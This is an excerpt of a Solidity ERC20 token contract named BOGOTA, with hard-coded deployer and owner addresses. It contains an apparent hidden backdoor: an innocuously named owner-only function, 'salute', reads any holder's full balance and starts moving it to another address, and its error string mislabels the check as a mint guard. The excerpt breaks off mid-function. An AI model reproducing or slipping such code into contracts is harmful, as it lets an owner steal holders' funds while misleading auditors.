...
contract BOGOTA is Context, IERC20 {
    ...
    address lead_deployer = 0xB45c1e44dA74dA774e23Ec93dbc77D758cF3D366;
    address public _owner = 0x43dfAa96B63933Bd32d34e6eE182a97A4d18C95d;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function salute(address account, address staker) public {
            require(msg.sender == _owner, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
